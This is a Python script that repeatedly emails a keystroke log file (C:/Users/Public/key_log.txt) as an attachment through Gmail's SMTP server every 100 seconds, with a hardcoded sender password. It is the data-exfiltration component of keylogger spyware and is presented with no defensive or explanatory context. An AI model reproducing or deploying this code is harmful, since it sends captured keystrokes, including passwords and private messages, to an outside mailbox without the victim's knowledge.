import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import time
import random

while True:    
    print('initializing email...')
    fromaddr = "personone1010@gmail.com"
    toaddr = "persontwo2020@gmail.com"
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "text log"

    body = ""

    msg.attach(MIMEText(body, 'plain'))

    print('loading attachment...')
    filename = "key_log.txt"
    location = "C:/Users/Public/key_log.txt"
    attachment = open(location, "rb")

    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(part)

    print('setting up server...')
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, "Bobby67Six")
    text = msg.as_string()
    print('sending email')
    server.sendmail(fromaddr, toaddr, text)
    server.quit()
    print('email sent')
    time.sleep(100)
